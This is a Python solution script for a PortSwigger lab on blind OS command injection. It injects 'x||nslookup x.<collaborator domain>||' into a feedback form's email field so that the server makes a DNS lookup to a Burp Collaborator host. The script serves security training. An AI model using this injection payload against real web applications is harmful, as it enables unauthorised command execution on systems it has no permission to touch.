# Lab 04 — Blind OS command injection with out-of-band interaction
# PortSwigger: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
#
# Vulnerability: Same blind feedback function, but this time there is no
#                accessible location to redirect output to — the only
#                observable signal is an out-of-band network interaction
# Aim:           Trigger a DNS lookup to Burp Collaborator, confirming the
#                injection without needing any readable output
#
# Technique:
#   Inject an nslookup command targeting a Burp Collaborator subdomain.
#   If the injection works, the SERVER itself performs a DNS lookup for
#   that subdomain — Collaborator logs the interaction, giving unambiguous
#   proof of code execution with none of the timing-based uncertainty.
#
# Requires: Burp Suite Pro (Collaborator feature).
#           Update COLLABORATOR_DOMAIN before running.
#
# Usage: python os_command_injection_lab04.py <url>

import sys
import urllib3
from proxies import proxies
from os_command_injection_utils import banner, section, make_session, submit_feedback, check_status, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── UPDATE THIS ────────────────────────────────────────────────────────────
COLLABORATOR_DOMAIN = "YOUR-COLLABORATOR-ID.oastify.com"
# ────────────────────────────────────────────────────────────────────────────


def build_payload(collab_domain):
    return f"x||nslookup x.{collab_domain}||"


if __name__ == "__main__":
    banner()
    section("LAB 04 — BLIND OS COMMAND INJECTION WITH OUT-OF-BAND INTERACTION")

    if len(sys.argv) != 2:
        print("  Usage: python os_command_injection_lab04.py <url>")
        sys.exit(1)

    if COLLABORATOR_DOMAIN == "YOUR-COLLABORATOR-ID.oastify.com":
        print("  ✘  Update COLLABORATOR_DOMAIN in the script before running.")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    payload = build_payload(COLLABORATOR_DOMAIN)
    print(f"  ➜  Payload (email field): {payload}\n")

    r = submit_feedback(session, url, payload)
    check_status(r, [200], "Feedback submission with OOB payload")

    print()
    print("  ➜  Next steps:")
    print("     1. Open Burp Collaborator → click 'Poll now'")
    print("     2. Look for an incoming DNS interaction for:")
    print(f"        x.{COLLABORATOR_DOMAIN}")
    print("     3. A received interaction confirms the injected command executed")
    print()
    print("  ℹ  This is your fallback technique whenever neither visible output")
    print("     nor a writable/servable directory is available. A DNS lookup")
    print("     to a domain only YOU control is unambiguous proof of execution.")
